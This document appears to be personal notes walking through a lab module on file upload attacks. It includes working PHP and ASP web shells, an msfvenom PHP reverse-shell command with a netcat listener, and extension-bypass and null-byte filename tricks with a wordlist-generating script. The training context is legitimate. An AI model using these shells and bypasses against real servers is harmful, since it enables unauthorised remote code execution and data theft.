# Intro

## Intro

File uploads are a huge part of current web apps. Many apps allow a profile photo upload, or you might be able to upload documents like PDFs. However with this prevalence comes the risk of potential attacks.

File upload attacks are among the most common found vulnerabilities. And they are usually rated high or critical. Without proper validation, it can be possible to gain remote command execution on a server, or introduce other vulnerabilities. 

# Basic Exploitation

## Absent Validation

The first and most dangerous form of upload vuln, is absent validation. In this form we can upload any file type without restriction. If we cna identify what programming language is being run on the backend server we can possibly gain remote code execution.

One way to determine what language is being run on the backend is to check the index.[file extension] on the current page. We have done this in the past to fuzz for the server type. But this will not always be accurate, as sometimes they web app may not use index pages, or may use more than one web extension.

We can also use something like `https://www.wappalyzer.com/`, which is a browser extension that will tell you the backend server information.

If we do find a web page that seems to have no validation, the first thing we can do is test and see if there is any input validation by running something like `<?php echo "Hello HTB";?>` and visiting the resulting web page to see if it is displayed.

The question in this section is:
Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.

Uploading a file containing:
``` PHP
<?php $var = gethostname(); echo $var;?>
```
Gets the answer.

## Upload Exploitation

After we find a vulnerable web app, we can attempt to get a web shell by uploading a malicious script. One good example of this is `https://github.com/Arrexel/phpbash` which is a php bash script.

But there are many more that we can find in SecLists. If we look in SecLists/Web-Shells we can find lots of web shells for all languages.

There is also a chance that we won't have access to online resources like these (for instance in a pen test), so knowing how to write a basic web shell is good. 

For PHP, uploading a file with:
``` PHP
<?php system($_REQUEST['cmd']); ?>
```
Will give command execution. The system() command runs system commands. And we can pass in a command using a get paramater (e.g. ?cmd=id).

Similarly we can do the same thing in ASP with:
``` ASP
<% eval request('cmd') %>
```

Now lets look at how we can get a reverse shell. First lets get a reverse shell script in PHP from `https://github.com/pentestmonkey/php-reverse-shell`

Once we copy this file over, we need to update the IP to ours and the port to the desired port. 

Then we can start a netcat listener, upload the file, and visit the page and it should work.

Like web shells, reverse shells may not always be easily accessible, and these are less easy to remember. Luckily we can use the msvenom to generate a reverse shell script.

We can generate a reverse shell for php using msvenom like:
`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

Then we can listen with netcat like:
`nc -lvnp OUR_PORT`

The question in this section is:
 Try to exploit the upload feature to upload a web shell and get the content of /flag.txt 

I uploaded the web shell we downloaded above and visited the page.

Then I ran:
```
ls

ls ..

ls ../../

ls ../../../

ls ../../../../

cat ../../../../flag.txt
```

# Bypassing Filters

## Client-Side Validation

Lots of web apps only perform input validation on the front end. However, this is easily bypassed by directly interacting with the server. Or we can modify the front-end code using the browsers dev tools.

If there is front-end validation that we need to deal with, we can intercept the request using Zap or Burp. Then we can select a valid formatted file, and before uploading, change the file to the one we really want. That will allow us to bypass the client-side validation.

The other option for bypassing this validation is to go into the dev tools and inspect the code that is checking the validation. We notice in the example in this section it is simply running a script to validate the extension of the file being uploaded. So we can simply modify this code to either allow our php extension or remove the check entirely.

The question in this seciton is:
Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice) 

To get this I intercepted the upload on Burp and uploaded a file called shell.php with:
`<?php sytem($_REQUEST['cmd']); ?>` in the content.

Then I ran the same set of commands as above and got the answer.

## Blacklist Filters

In this section, it covers how to bypass a blacklist. A blacklist is just a list of things not allowed, and in this example it would be a list of file extensions that are not allowed (e.g. .php, .py, .c, etc). Of course in reality, anyone with a security mindset would use a whitelist if they chose to use anything. But its an interesting exercise none the less.

The section covers how to fuzz the blacklist for allowed extensions. The first thing we want to do is intercept the request and then send it to FUZZ in zap or intruder in Burp. Then we can start fuzzing.

We can use SecLists list of Common Web Extensions located at SecLists/Discovery/WebContent/web-extensions.txt for our fuzz. I used Zap for this, as the free version is not rate-limited for fuzzing.

Once we find some not blacklisted extensions, we can then upload one of those file withs a web shell in the content. Then visit it and do as we please.

The question in this section is:
Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt" 

I ran the fuzz using zap and found a bunch of accepted extensions, including php2, php3, php4, php6.

Uploading a php6 file with the webshell... but the webshell fails.
Same with php4...

I see a .pht file in the list of accepted files.

Looking it up, I see that a .pht file is:
The PHT file stores HTML page that includes a PHP script, dynamically generates HTML, often by accessing database information. PHT seems to be very little used format. These days, you're more likely to see . phtml files

This seems promising. Uploading the shell... doesn't seem to work...
and .phtml doesn't either

I see a .asp file is allowed. I don't think that will work on a php backend... but trying.

Nope doesn't work...

When I re-run the fuzzer with a bigger list of file extensions, I see that pHp5 is allowed. Trying... didn't work.

I was doing this the stupid way. I re-ran the fuzz with the list of extensions in the cheatsheet. Then I reran the fuzz using ?cmd=ls at the end.

I found that .phar was the extension I need.

Then finding the answer was easy.

## Whitelist Filters

This section covers whitelist filters. Specifically, it mentions that a lot of servers will use both a whitelist and blacklist at the same time. Usually this is done with regex such that it defines what file types are allowed. Not what types are not. However, there are vulnerabilities with this too. 

If the developer is not good with regex they might write something like this:
``` PHP
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

This code only verifies that one of the accepted file types is present in the string, not that it ends with that type. So a file like shell.png.php would be accepted.

However, this is not likely to happen as most people will write something like:
``` PHP
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))
```

Which clearly defines the end of the line with $. 

There are also cases when the file upload it self is not vulnerable, but the web server configuration is. For example, the /etc/apache2/mods-enabled/php7.4.conf config file for Apache2 includes the following:
``` xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

This config file determines which files can run PHP, so it allows .phar, .php, and .phtml. However, this regexs pattern has the same mistake as above. In this case, any file with .php, .phtml, etc will be allowed to run. So a file named shell.php.jpg would work.

The last thing it covers is character injection. By injecting certain characters its possilble to have the application misinterpret the filename and execute the uploaded file as PHP.

Some of these characters are:
- %20
- %0a
- %00
- %0d0a
- /
- .\
- .
- …
- :

For example, shell.php%00.jpg works with PHP servers with version 5.X and earlier. It causes the PHP web server to end the file name after %00, and store it as shell.php.

We can run something like:
``` BASH
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
To get all permutations of these file extensions with the added characters.

Then we can run that with Zap or Burp and see if they work.

The question in this section is:
The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

Okay so this one was difficult to figure out. Mostly because I relied on the scripts they provided working out of the box, that was stupid and not something I should have done.

To solve this one, you need to notice that the reverse double extension allows php, AND phar and phtml. When you look at the script provided above it only outputs things for php. So it isn't going to work. But it's easily modified to work.

Then once you upload the files, you can then check allof the uploaded files and see if they return results when you add ?cmd=ls.

I found a script online to do this easily. Its linked in the repository called repeat.sh.

When this is run we find that tmp:.phtml.jpg works. Then we can just run the usual ls directory traversal until we find the flag.

## Type Filters



# Other Upload Attacks

## Limited File Uploads

## Out Upload Attacks

# Prevention

## Prevention

# Skill Assessment

## Skills Assessment
